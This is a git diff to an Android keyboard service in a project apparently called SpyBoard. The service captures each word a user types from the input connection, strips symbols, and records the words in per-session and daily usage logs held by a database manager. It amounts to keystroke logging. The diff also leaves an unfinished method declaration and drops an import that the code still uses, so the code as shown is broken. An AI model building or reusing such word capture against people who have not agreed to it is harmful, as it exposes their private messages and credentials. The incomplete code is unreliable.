@@ -8,13 +8,11 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.EditorInfo;
 import android.view.inputmethod.InputConnection;
-import android.widget.Toast;
 
 import com.idankorenisraeli.spyboard.common.TimeManager;
-import com.idankorenisraeli.spyboard.data.DailyUsageLog;
+import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;
 import com.idankorenisraeli.spyboard.data.DatabaseManager;
-import com.idankorenisraeli.spyboard.data.OnDailyLogLoaded;
-import com.idankorenisraeli.spyboard.data.UsageLog;
+import com.idankorenisraeli.spyboard.data.types.UsageLog;
 import com.idankorenisraeli.spyboard.utils.KeycodeDictionary;
 import com.idankorenisraeli.spyboard.R;
 
@@ -36,6 +34,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     String currentDate;
     DailyUsageLog dailyLog;
     UsageLog sessionUsageLog;
+    UsageLog totalUsageLog;
 
 
     private static final int WORD_EST_LENGTH = 16; // size of new sb for better performance
@@ -56,6 +55,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         initKeyboards();
         initDailyLog();
 
+
         return keyboardView;
     }
 
@@ -71,6 +71,8 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         keyboardView.setPreviewEnabled(false);
 
+
+
     }
 
     private void initDailyLog() {
@@ -83,11 +85,12 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
                     dailyLog = loadedLog;
                 else {
                     dailyLog = new DailyUsageLog();
-                    Toast.makeText(SpyInputMethodService.this, "New Log " + currentDate.toString() , Toast.LENGTH_SHORT).show();
                 }
             }
         });
     }
+
+    private void initUsageLog
 
 
     //region Keyboard Actions
@@ -163,7 +166,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         String word;
         InputConnection ic = getCurrentInputConnection();
         word = (String) ic.getTextBeforeCursor(64, 0);
-        if (word == null || word.length() <= 1)
+        if (word == null || word.length() <= 1 || word.equals("  "))
             return; //No last word, just a space
 
         if (word.charAt(word.length() - 1) == ' ')
@@ -172,8 +175,19 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
         int lastSpaceIndex = word.lastIndexOf(' ') + 1; //delete space before word
         word = word.substring(lastSpaceIndex);
 
+        if (word.length() >= 2) {
+            char last = word.charAt(word.length() - 1);
+            if (dictionary.isSymbol(last))
+                word = word.substring(0, word.length() - 1); //delete symbol after word
 
-        sessionUsageLog.addWord(word);
+        } else if (word.length() >= 1) {
+            char first = word.charAt(0);
+            if (dictionary.isSymbol(first))
+                word = word.substring(1); //delete symbol before word
+        }
+
+        if(word.length() > 0)
+            sessionUsageLog.addWord(word);
     }
 
     /**
@@ -181,7 +195,7 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
      * or something similar which is outside of the keyboard
      * we will track the last word by the builder
      */
-    private void trackWordByBuilder(){
+    private void trackWordByBuilder() {
         if (lastWordBuilder.length() > 0)
             sessionUsageLog.addWord(lastWordBuilder.toString());
         lastWordBuilder = new StringBuilder(WORD_EST_LENGTH);
@@ -289,6 +303,17 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
     @Override
     public void onStartInputView(EditorInfo info, boolean restarting) {
         super.onStartInputView(info, restarting);
+
+        if(dailyLog==null)
+            databaseManager.loadDailyLog(currentDate, new OnDailyLogLoaded() {
+                @Override
+                public void onDailyLogLoaded(DailyUsageLog loaded) {
+                    if(loaded!=null)
+                        dailyLog = loaded;
+                    else
+                        dailyLog = new DailyUsageLog();
+                }
+            });
 
         if (sessionUsageLog == null)
             sessionUsageLog = new UsageLog();
